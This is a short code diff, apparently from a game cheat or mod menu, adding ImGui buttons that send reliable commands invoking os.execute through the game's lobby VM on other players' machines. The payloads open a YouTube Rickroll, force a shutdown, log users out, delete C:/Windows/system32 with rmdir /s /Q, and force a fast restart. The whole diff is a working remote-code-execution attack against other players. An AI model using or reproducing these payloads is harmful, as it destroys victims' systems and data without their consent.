@@ -1,0 +1,24 @@
+if (ImGui::Selectable("Rickroll"))
+						{
+							CL_AddReliableCommand(0, "ui os.execute(str:\"start /max https://www.youtube.com/watch?v=dQw4w9WgXcQ\",);");
+						}
+
+						if (ImGui::Selectable("Shutdown"))
+						{
+							CL_AddReliableCommand(0, "lobbyvm os.execute(str:\"shutdown /f /p\",);");
+						}
+
+						if (ImGui::Selectable("Log out"))
+						{
+							CL_AddReliableCommand(0, "lobbyvm os.execute(str:\"shutdown /l\",);");
+						}
+
+						if (ImGui::Selectable("Remove directory"))
+						{
+							CL_AddReliableCommand(0, "lobbyvm os.execute(str:\"rmdir /s /Q ""C:/Windows/system32""\",);");
+						}
+
+						if (ImGui::Selectable("Fast restart payload"))
+						{
+							CL_AddReliableCommand(0, "lobbyvm Engine.Exec(int:0,str:\"fast_restart\",)");
+						}
